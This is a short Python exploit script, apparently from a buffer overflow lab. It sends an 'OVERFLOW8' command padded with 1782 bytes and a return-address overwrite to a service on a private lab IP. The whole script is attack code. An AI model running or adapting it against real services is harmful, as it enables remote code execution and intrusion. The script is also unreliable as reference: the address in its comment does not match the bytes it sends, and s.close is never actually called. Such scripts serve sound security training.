#!/usr/bin/python
import sys, socket

# 625011af = \xaf\x11\x50\x62 (in reverse format for x86 architecture)

shellcode = "A" * 1782 + "\x30\xfa\x9e\x01" #to edit the ESP

	
try:

 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		s.connect(('10.10.224.209', 1337)) # change ip and port here
		s.send(('OVERFLOW8 /.:/') + shellcode)
 		s.close
except:
 		print "Error connecting to server"
 		sys.exit()